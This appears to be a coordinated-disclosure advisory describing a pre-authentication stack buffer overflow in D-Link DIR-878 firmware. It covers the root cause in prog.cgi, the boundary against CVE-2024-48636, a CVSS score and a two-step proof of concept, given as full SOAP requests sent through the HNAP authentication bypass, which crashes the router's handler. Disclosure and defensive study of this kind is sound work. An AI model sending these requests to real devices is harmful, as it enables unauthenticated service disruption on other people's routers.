# D-Link DIR-878 SetVLANSettings → SetTriggerADIC Second-order Stack-based Buffer Overflow

> **Status:** CVE: Not assigned (identifier requested). Vendor notification: pending. Repository published for coordinated disclosure.

## Summary

A stack-based buffer overflow vulnerability was discovered in D-Link DIR-878 (REV A) firmware
v1.20B05. The `SetVLANSettings` HNAP handler stores the user-controlled `VLANIDInfoLists/VLANID:0/VID`
field — without any length or format validation — into the nvram key `wan_wan0_ifname` (up to 255
bytes). Later, the `SetTriggerADIC` handler concatenates that stored value with `sprintf` into a
**128-byte stack buffer** to build `/usr/sbin/pppoe-discovery -I <ifname> &` and
`/sbin/udhcpc-discovery -i <ifname> &` command lines. A purely **alphanumeric** `VID` of ≥ 98
characters (e.g. `1` + 150 × "D") overflows the stack frame and crashes the process; the same
over-long value additionally crashes the downstream `udhcpc-discovery` binary. The `Set*` handlers
are reachable pre-authentication via the previously disclosed HNAP bypass (CVE-2020-15633 class,
verified on v1.20B05).

> **Scope note:** the shell-metacharacter **command-injection facet** of the same `VID` field is
> already covered by **CVE-2024-48636** and is explicitly **not claimed** here. This advisory
> claims only the distinct stack-overflow facet, which no metacharacter filter can fix.

## Affected Product

- Vendor: D-Link
- Product: DIR-878, Hardware Revision A
- Firmware: v1.20B05 (verified). The product is EoL/EoS; later v1.30B08 hotfix builds share the
  same HNAP codebase lineage but were not individually re-verified.

## Vulnerability Details

- Type: Stack-based Buffer Overflow — CWE-121 (stored/second-order data flow, cf. CWE-915)
- Component: `bin/prog.cgi`
- Write side: `SetVLANSettings` handler (0x46d180)
- Sink: `SetTriggerADIC` handler (0x459b60)

### Root Cause

Write side: `VID` is stored via `snprintf(buf256, "%s.%s", phy_ifname, VID)` into nvram
`wan_wan0_ifname` with no length check beyond the 256-byte format buffer (effective cap 255).

Sink: when `TriggerADIC=true` and `wan_wan0_status != "DISCONNECTED"` (the default empty value
satisfies this), the handler executes the equivalent of:

```c
char cmd[128];
sprintf(cmd, "/usr/sbin/pppoe-discovery -I %s &", ifname_from_nvram);  /* overflow point 1 */
twsystem(cmd);
sprintf(cmd, "/sbin/udhcpc-discovery -i %s &", ifname_from_nvram);     /* overflow point 2 */
twsystem(cmd);
```

Command template overhead is 30 bytes, so a stored ifname of **N ≥ 98** overflows the 128-byte
stack buffer; the observed test used N = 152.

### Boundary against CVE-2024-48636

| Dimension | CVE-2024-48636 (existing) | This advisory |
|---|---|---|
| Defect type | CWE-78 command injection (unfiltered metacharacters) | CWE-121 stack buffer overflow (unbounded length) |
| Trigger payload | short payload relying on `;` etc. | **purely alphanumeric** over-long VID, no metacharacters |
| Sink | `twsystem` executes attacker command | `sprintf` overwrites the 128-byte stack frame |
| Fix | metacharacter filtering | length validation / bounded copy — **filtering metacharacters does not fix this defect** |
| Side effect | — | downstream `udhcpc-discovery` also crashes |

## Proof of Concept (non-destructive)

Step 1 — store the over-long VID (returns `SetVLANSettingsResult=OK`; the VID **must start with a
digit**, otherwise `atoi()==0` routes to a branch that discards it):

```xml
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetVLANSettings xmlns="http://purenetworks.com/HNAP1/"><Enabled>true</Enabled><PriorityEnabled>false</PriorityEnabled><ISPName>x</ISPName><VLANIDInfoLists><VLANID><VID>1DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD</VID><Priority>0</Priority></VLANID><VLANID><VID>2</VID><Priority>0</Priority><VendorClass>x</VendorClass></VLANID><VLANID><VID>3</VID><Priority>0</Priority><VendorClass>x</VendorClass></VLANID></VLANIDInfoLists><VLANRuleInfoLists><VLANRule><ServiceMapping>LAN1</ServiceMapping></VLANRule><VLANRule><ServiceMapping>LAN1</ServiceMapping></VLANRule><VLANRule><ServiceMapping>LAN1</ServiceMapping></VLANRule><VLANRule><ServiceMapping>LAN1</ServiceMapping></VLANRule><VLANRule><ServiceMapping>LAN1</ServiceMapping></VLANRule><VLANRule><ServiceMapping>LAN1</ServiceMapping></VLANRule></VLANRuleInfoLists></SetVLANSettings></soap:Body></soap:Envelope>
```

Step 2 — trigger:

```xml
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetTriggerADIC xmlns="http://purenetworks.com/HNAP1/"><TriggerADIC>true</TriggerADIC></SetTriggerADIC></soap:Body></soap:Envelope>
```

Send both with the HNAP bypass header (`POST /HNAP1/?GetCAPTCHAsetting`, `SOAPAction` naming the
respective action). Observed on step 2: **HTTP 500**, lighttpd log `unexpected end-of-file
(perhaps the fastcgi process died)`, a core dump attributed to `prog.cgi` (first 1 MB contains
`prog.cgi`/`qemu-mipsel` strings). In the first test round an additional `udhcpc-discovery` crash
core was observed, confirming the second command line propagates the same over-long value to the
downstream binary. The overflow writes ≈182 bytes into the 128-byte frame, reaching the saved
return-address area (static frame analysis; register-level forensics not performed — stated
honestly).

**Cleanup:** the PoC writes nvram key `wan_wan0_ifname` (and the sibling `wan_wan1_ifname`).
Restore normal operation by setting VLAN settings back to defaults via the web UI (or reboot to
the last saved configuration, depending on nvram commit behavior). The crash itself is transient —
the FastCGI worker is restarted automatically.

## Impact

- Attacker profile: unauthenticated (via the known HNAP bypass), adjacent network.
- Proven impact: pre-authentication crash of `prog.cgi` (HTTP 500, core dump), repeatable;
  collateral crash of `udhcpc-discovery` (WAN service disruption).
- The overwrite reaches the saved return-address area, so code execution is plausible with
  further exploitation work (not developed, not claimed as proven).

## CVSS 3.1

`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` — **6.5** (Medium)

Scored on the proven pre-authentication crash; exploitation potential documented above.

## Discovery

Discovered by Zimo-666 on 2026-10-12 via static reverse engineering plus dynamic end-to-end
reproduction (two independent rounds) with core attribution in a qemu-user rehosting environment.
Vendor notified: pending.

---

## Repository files

| File | Content |
|---|---|
| `README.md` | This advisory |
| `poc.sh` | Non-destructive reproduction script, derived from the request recorded above |

> The script reproduces the HTTP request documented in this advisory. It is not a substitute for
> the recorded test evidence; the observed outputs quoted above are the evidence.
